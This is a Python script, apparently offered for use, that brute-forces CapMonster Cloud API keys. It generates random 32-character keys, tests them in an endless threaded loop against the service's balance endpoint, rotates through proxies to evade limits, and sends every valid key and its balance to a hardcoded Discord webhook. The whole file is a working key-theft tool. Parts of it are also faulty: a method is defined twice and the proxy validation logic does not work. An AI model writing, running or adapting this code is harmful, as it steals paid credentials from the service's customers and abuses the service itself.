import httpx
import os
import random
import string
import time
import json
import concurrent.futures
import logging

GENERATED_KEYS_FILE = "keys.txt"
PROXIES_FILE = "proxies.txt"
WEBHOOK_URL = "https://discord.com/api/webhooks/k44R5vKMuqk9HUsD5vi_7aitXmOcR"

class CapMonsterChecker:
    def __init__(self):
        self.keys = []
        self.use_proxies = False
        self.proxies = []
        self.logger = logging.getLogger("CapMonsterChecker")
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter("[%(levelname)s] [%(asctime)s] - %(message)s")
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)
    
    def generate_keys(self, num_keys, key_length):
        chars = string.ascii_lowercase + string.digits
        generated_keys = []
        
        for _ in range(num_keys):
            key = ''.join(random.choice(chars) for _ in range(key_length))
            generated_keys.append(key)
        
        return generated_keys
    
    def save_keys_to_file(self, keys):
        with open(GENERATED_KEYS_FILE, 'w') as f:
            for key in keys:
                f.write(key + '\n')
    
    def load_keys_from_file(self):
        if os.path.exists(GENERATED_KEYS_FILE):
            with open(GENERATED_KEYS_FILE, 'r') as f:
                self.keys = [line.strip() for line in f.readlines()]
    
    def load_proxies_from_file(self):
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'r') as f:
                self.proxies = [line.strip() for line in f.readlines()]
    
    def ask_user_for_proxy_option(self):
        answer = input("Do you want to use proxies? (y/n): ").lower()
        self.use_proxies = answer.startswith('y')
        if self.use_proxies:
            self.load_proxies_from_file()  # Load proxies from the file
    
    def check_keys(self):
        if not self.keys:
            self.logger.warning("[!] No keys available. Generating new keys...")
            self.generate_and_check_keys()
            return

        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                while True:
                    futures = [executor.submit(self.check_key_with_retry, key, random.choice(self.proxies) if self.use_proxies else None)
                               for key in self.keys]
                    concurrent.futures.wait(futures, timeout=60)

        except Exception as e:
            self.logger.error(f"[ERROR] Exception in checker -> {e}")
            time.sleep(60)  # Wait for 60 seconds before retrying

    def check_key_with_retry(self, key, proxy, max_retries=3):
        retries = 0
        while retries < max_retries:
            try:
                self.check_key(key, proxy)
                return
            except httpx.TimeoutException:
                self.logger.warning(f"Timeout while checking key {key}. Retrying... ({retries + 1}/{max_retries})")
                retries += 1
                time.sleep(5)  # Wait for 5 seconds before retrying
        self.logger.error(f"Failed to check key {key} after {max_retries} retries.")

    def check_key(self, key, proxy):
        proxies = {"http": proxy, "https": proxy} if proxy else None
        try:
            checkResp = httpx.post(
                "https://api.capmonster.cloud/getBalance",
                json={"clientKey": key},
                proxies=proxies,
                timeout=30
            )
            if checkResp.status_code == 200:
                balance = checkResp.json().get('balance')
                if balance is not None:
                    self.logger.info(f"Valid Key: {key} | Balance: {balance}")
                    self.send_to_discord(key, balance)
            elif checkResp.json().get('errorCode') == "ERROR_KEY_DOES_NOT_EXIST":
                self.logger.info(f"Invalid Key: {key}")
            else:
                self.logger.error(f"Error checking key: {key} | {checkResp.status_code} | {checkResp.json()}")
        except httpx.TimeoutException:
            self.logger.error(f"Timeout while checking key {key}")
        except Exception as e:
            self.logger.error(f"Exception in checking key {key} -> {e}")

    
    def validate_proxies(self):
        self.logger.info("Validating proxies...")
        valid_proxies = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(self.check_key, '', proxy) for proxy in self.proxies]
            for future in concurrent.futures.as_completed(futures):
                proxy = future.result()
                if proxy:
                    valid_proxies.append(proxy)
        self.proxies = valid_proxies
    
    def check_keys(self):
        if not self.keys:
            self.logger.warning("[!] No keys available. Generating new keys...")
            self.generate_and_check_keys()
            return
        
        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")
        
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                while True:
                    futures = [executor.submit(self.check_key, key, random.choice(self.proxies) if self.use_proxies else None)
                               for key in self.keys]
                    concurrent.futures.wait(futures, timeout=60)
        
        except Exception as e:
            self.logger.error(f"[ERROR] Exception in checker -> {e}")
            time.sleep(60)  # Wait for 60 seconds before retrying
        
    def generate_and_check_keys(self):
        keys = self.generate_keys(1000, 32)  # Generate 1000 new keys
        self.save_keys_to_file(keys)
        self.load_keys_from_file()
        self.ask_user_for_proxy_option()  # Ask the user for proxy option
        if self.use_proxies:
            self.validate_proxies()
        self.check_keys()
    
    def send_to_discord(self, key, balance):
        data = {
            "content": f"Valid Key: {key} | Balance: {balance}"
        }
        headers = {
            "Content-Type": "application/json"
        }
        
        try:
            response = httpx.post(WEBHOOK_URL, json.dumps(data), headers=headers)
            if response.status_code == 204:
                self.logger.info("Message sent to Discord webhook")
            else:
                self.logger.error(f"Error sending message to Discord webhook: {response.status_code} - {response.text}")
        except Exception as e:
            self.logger.error(f"Exception in sending to Discord: {e}")

if __name__ == "__main__":
    checker = CapMonsterChecker()
    checker.load_keys_from_file()
    checker.check_keys()
